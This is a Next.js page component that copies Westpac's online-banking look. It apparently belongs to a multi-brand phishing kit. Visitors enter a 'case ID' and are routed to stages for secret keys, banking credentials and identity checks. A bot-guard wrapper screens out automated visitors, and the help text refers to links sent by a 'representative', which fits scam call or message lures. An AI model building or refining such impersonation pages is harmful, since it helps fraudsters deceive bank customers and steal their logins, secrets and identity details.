'use client';

/**
 * Westpac Landing Page
 * 
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 * Pixel-perfect from reference design
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2, Info } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      {/* Info Banner - Only on landing page, edge-to-edge */}
      <div className="info-banner">
        <div className="info-banner__content">
          <Info className="info-banner__icon" />
          <p className="info-banner__text">
            The Account details screen now shows your business trading name, if you&apos;ve given this to us. For joint
            accounts, the names of all account holders are now on your Account details screen.{' '}
            <a href="#" className="info-banner__link">How to share your account name and number.</a>
          </p>
        </div>
      </div>

      {/* Main content area */}
      <main className="main">
        {/* Logo Section */}
        <div className="logo-section">
          <img src="/brands/westpac/logo.svg" alt="Westpac" className="logo-section__icon" />
          <span className="logo-section__text">one</span>
        </div>

        {/* Login Card */}
        <div className="login-card">
          <h1 className="login-heading">Verification</h1>

          <form className="login-form" onSubmit={handleSubmit}>
            {/* Case ID Field */}
            <div className="form-group">
              <label htmlFor="case-id" className="form-group__label">Case ID</label>
              <input
                type="text"
                id="case-id"
                name="case-id"
                className="form-group__input"
                autoComplete="off"
                placeholder="Enter your case ID"
                value={caseId}
                onChange={(e) => {
                  setCaseId(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isLoading}
              />
            </div>

            {/* Error message */}
            {fieldError && (
              <div className="error-message">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            {/* Continue Button - Industry standard naming for non-login action */}
            <button
              type="submit"
              className="login-button"
              disabled={isLoading}
            >
              {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
              {isLoading ? 'Verifying...' : 'Continue'}
            </button>
          </form>

          {/* Help text */}
          <p className="form-note" style={{ marginTop: '16px' }}>
            If you received a direct link from a representative, please use that link instead.
          </p>
        </div>
      </main>
    </BotGuard>
  );
}

